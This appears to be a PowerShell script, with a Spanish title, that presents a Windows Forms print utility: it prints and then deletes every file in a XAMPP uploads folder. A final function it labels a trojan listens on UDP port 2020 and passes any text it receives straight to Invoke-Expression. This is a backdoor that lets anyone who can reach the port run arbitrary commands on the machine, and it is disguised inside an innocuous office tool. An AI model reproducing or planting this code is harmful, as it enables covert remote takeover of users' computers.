# Script de para impresiones con un troyano

```powershell
 
###########################
###########################
#######-IMPRESIONES-#######
###########################
###########################



function imprimir {

        foreach ($cosas in Get-ChildItem "C:\xampp\htdocs\uploads")
        {

       
       $archivoex = $cosas.Name
       $archivo = $archivoex.Split(".")[0]
       $tick = (get-date).Ticks
       $ruta = "C:\xampp\htdocs\impresiones" + "\$archivo($tick)"
       
       
       
       Start-Process -FilePath ($cosas | select fullname).fullname -Verb print 
       Start-Sleep -Seconds 5
       [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
       Start-Sleep -Seconds 2
       [System.Windows.Forms.SendKeys]::SendWait($ruta)
       Start-Sleep -Seconds 2
       [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
       Start-Sleep -Seconds 2

        }
}

function limpiar {

        foreach ($cosas in Get-ChildItem "C:\xampp\htdocs\uploads")
                {
                    
                    $borrado = ($cosas|select fullname).fullname
                    Remove-Item -Path $borrado

                }

}



###########################
###########################
#######-FORMULARIO-########
###########################
###########################

function mensaje {
$Form.Controls.Add($Label)
}

function formulario {

#Formulario
$Form = New-Object System.Windows.Forms.Form
$Form.Text="Formulario"
$Form.Size=New-Object System.Drawing.Size(500,500)
$Form.StartPosition="CenterScreen"

#Botón1
$Button1=New-Object System.Windows.Forms.Button
$Button1.Size=New-Object System.Drawing.Size(75,23)
$Button1.Text="IMPRIMIR"
$Button1.Location=New-Object System.Drawing.Size(120,220)



#Funcionalidad para el formulario:
$Form.KeyPreview = $True
$Form.Add_KeyDown({if ($_.KeyCode -eq "Enter"){imprimir;limpiar;mensaje}})
$Form.Add_KeyDown({if ($_.KeyCode -eq "Escape"){$form.Close()}})

#Funcionalidad para el botón:
#Pulsar Enter almacena en una variable el contenido de la caja de texto y se muestra
#Pulsar Escape sale del formulario
$Button1.Add_Click({imprimir;limpiar;mensaje})

#Añadir botones
$Form.Controls.Add($Button1)

#Añadir un mensaje

$Label=New-Object System.Windows.Forms.Label
$Label.Text="Impresiones realizadas con éxito!"
$Label.AutoSize=$True
$Label.Location=New-Object System.Drawing.Size(100,140)


$Form.ShowDialog()

}



###########################
###########################
########-TROYANO-##########
###########################
###########################



function troyano {

$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Any,$port)
$udpclient=new-Object System.Net.Sockets.UdpClient $port
$content=$udpclient.Receive([ref]$endpoint)
[Text.Encoding]::ASCII.GetString($content) |iex
$udpclient.Dispose()

}

formulario ;troyano
```
